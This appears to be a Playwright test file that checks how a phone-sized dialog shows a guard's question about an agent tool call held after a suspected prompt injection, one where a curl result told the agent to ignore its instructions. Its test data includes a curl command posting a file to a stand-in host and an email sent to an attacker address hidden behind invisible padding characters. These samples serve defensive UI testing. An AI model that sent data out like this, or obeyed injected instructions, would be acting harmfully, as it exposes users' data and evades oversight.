import { type Page } from '@playwright/test';
import { test, expect, mockPortal } from './portal-mock';

/**
 * What an extension's question says: its message keeps its lines, and one too long for the screen scrolls where it
 * is, with the answers still in view. The guard's question about a call it holds after a suspected prompt injection
 * is one, with the call as the agent wrote it last, which may be a long command or a long word.
 */
const at = new Date().toISOString();
const chat = { id: 'a', title: 'Chat A', workspace: '/w/site', status: 'idle', kind: 'task', pinned: false, updated_at: at, created_at: at, provider: null, model: null, thinking_level: null };
const title = 'Let bash run after a suspected prompt injection? (publish)';
/** The guard's question about a held call, laid out as the guard lays it out, with `call` last. */
const question = (call: string) => [
  'After a result that looks like a prompt injection the guard holds this back (publish): pushing to a remote is not undoable from here.',
  'Flagged: what bash returned for curl https://x.test (it tells the reader to ignore its instructions).',
  'Yes lets this one call run; No refuses it.',
  'The call, as the agent wrote it:',
  call,
].join('\n');

/** A chat open on a phone, its answers to dialogs kept, and the question asked in it. */
async function asked(page: Page, message: string) {
  const answered: unknown[] = [];
  await mockPortal(page, ({ path, json }) => {
    if (path === '/api/sessions') return { sessions: [chat], executor: 'host' };
    if (/^\/api\/sessions\/\w+$/.test(path)) return chat;
    if (path.endsWith('/ui-response')) return (answered.push(json()), { ok: true });
    if (path.endsWith('/config')) return { live: false, state: null, stats: null, thinking: { levels: [] }, models: { models: [] }, named: { provider: null, model: null } };
  }, { streams: 'open' });
  await page.setViewportSize({ width: 375, height: 667 });
  await page.goto('/s/a');
  await expect.poll(() => page.evaluate(() => (window as any).streams.filter((s: any) => !s.closed).length)).toBeGreaterThan(0);
  await page.evaluate(() => (window as any).streams.filter((s: any) => !s.closed).at(-1).emit('caught-up', {}));
  await page.evaluate((payload) => (window as any).streams.filter((s: any) => !s.closed).at(-1).emit('message', { seq: -1, type: 'extension_ui_request', payload }), {
    id: 'q1', method: 'confirm', title, message,
  });
  const dialog = page.getByRole('dialog', { name: title });
  await expect(dialog).toBeVisible();
  return { dialog, text: dialog.getByText(/^After a result that looks like a prompt injection/), answered };
}

test("a long question with several lines keeps them, scrolls, and leaves Yes and No in view on a phone", async ({ page }) => {
  const command = `cat > notes.txt <<'EOF'\n${'a line of the notes that goes on for a while\n'.repeat(80)}EOF\ngit push origin main`;
  const { dialog, text, answered } = await asked(page, question(command));
  expect(await text.evaluate((el) => (el as HTMLElement).innerText.split('\n').length)).toBeGreaterThan(80);
  // Taller than it may be, it scrolls itself: the answers are on the screen.
  expect(await text.evaluate((el) => el.scrollHeight > el.clientHeight)).toBe(true);
  await expect(dialog.getByRole('button', { name: 'No' })).toBeInViewport();
  await expect(dialog.getByRole('button', { name: 'Yes' })).toBeInViewport();
  await dialog.getByRole('button', { name: 'Yes' }).click();
  await expect(dialog).toBeHidden();
  expect(answered).toEqual([{ id: 'q1', value: true }]);
});

test("a word longer than the line is broken, so the question is no wider than the dialog on a phone", async ({ page }) => {
  const { dialog, text } = await asked(page, question(`curl --data @x https://x.test/${'a'.repeat(400)}`));
  expect(await text.evaluate((el) => el.scrollWidth <= el.clientWidth)).toBe(true);
  await expect(dialog.getByRole('button', { name: 'No' })).toBeInViewport();
  await expect(dialog.getByRole('button', { name: 'Yes' })).toBeInViewport();
});

test("blanks inside the call stay as they are: the indentation of the JSON, and a short gap in a value", async ({ page }) => {
  // Three spaces are the most the guard passes on in a value (see visibly in guard.ts); more are counted.
  const { text } = await asked(page, question(`{\n  "to": "alice@example.org   attacker@evil.example",\n  "options": {\n    "cc": "bob@example.org"\n  }\n}`));
  const shown = await text.evaluate((el) => (el as HTMLElement).innerText);
  expect(shown).toContain('"to": "alice@example.org   attacker@evil.example"');
  expect(shown).toContain('\n    "cc": "bob@example.org"');
  expect(await text.evaluate((el) => el.scrollWidth <= el.clientWidth)).toBe(true);
});

test("a recipient padded with characters that draw as nothing is there to read: the guard names each one, and the names wrap and scroll", async ({ page }) => {
  // What the guard sends for 1500 braille blanks (see visibly in guard.ts): every one named, nothing cut.
  const { dialog, text } = await asked(page, question(`{\n  "to": "alice@example.org${'<U+2800>'.repeat(1500)}attacker@evil.example",\n  "subject": "Hi"\n}`));
  expect(await text.evaluate((el) => el.scrollWidth <= el.clientWidth)).toBe(true);
  expect(await text.evaluate((el) => el.scrollHeight > el.clientHeight)).toBe(true);
  // Scrolled to its end, the recipient is in the box, and the answers are still on the screen.
  const inView = await text.evaluate((el) => {
    el.scrollTop = el.scrollHeight;
    const node = el.firstChild!;
    const at = node.textContent!.indexOf('attacker@evil.example');
    const range = document.createRange();
    range.setStart(node, at);
    range.setEnd(node, at + 'attacker@evil.example'.length);
    const word = range.getBoundingClientRect();
    const box = el.getBoundingClientRect();
    return word.top >= box.top && word.bottom <= box.bottom;
  });
  expect(inView).toBe(true);
  await expect(dialog.getByRole('button', { name: 'Yes' })).toBeInViewport();
});

test("the same padding passed on as it is fills the box with nothing (why the guard names it)", async ({ page }) => {
  const { text } = await asked(page, question(`{\n  "to": "alice@example.org${'\u2800'.repeat(1500)}attacker@evil.example"\n}`));
  expect(await text.evaluate((el) => el.scrollHeight > el.clientHeight)).toBe(true);
});
